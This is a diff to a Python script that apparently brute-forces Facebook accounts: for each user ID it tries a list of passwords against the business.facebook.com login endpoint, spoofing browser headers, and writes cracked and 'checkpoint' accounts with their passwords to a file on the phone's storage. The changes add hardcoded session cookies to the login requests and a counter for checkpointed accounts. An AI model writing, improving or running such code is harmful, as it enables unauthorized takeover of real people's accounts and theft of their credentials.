@@ -2115,7 +2115,7 @@ def freeq(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M5--SUMON) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write(f"\r {green}(M5--SUMON) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -2131,6 +2131,14 @@ def freeq(uid,pwx,tl):
             'flow': 'login_no_pin',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'login': 'Masuk'}
+            cookies = {
+            'sb': 'rp_6ZrdRV1vg1JSQt-kGL7oZ',
+            'datr': 'rp_6ZvkONbQIhMeMcdrNQlTW',
+            'ps_l': '1',
+            'ps_n': '1',
+            'usida': 'eyJ2ZXIiOjEsImlkIjoiQXNrdzVtbHllcDV1OCIsInRpbWUiOjE3MjgxNDU1MzN9',
+            'fr': '1TtcqI6vgDuofxZxz.AWVJHOxxuJeeD1xfFqVh8Y0n3H0.BmvaYd..AAA.0.0.BnAWt4.AWXtdRBLWvk',
+            'wd': '934x773',}
             headers = {
             'Host': 'business.facebook.com',
             'method': 'POST',
@@ -2163,7 +2171,7 @@ def freeq(uid,pwx,tl):
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
-            po = Session.post(url, headers=headers, data=data).text
+            po = Session.post(url,cookies=cookies, headers=headers, data=data).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -2190,7 +2198,7 @@ def freeq(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
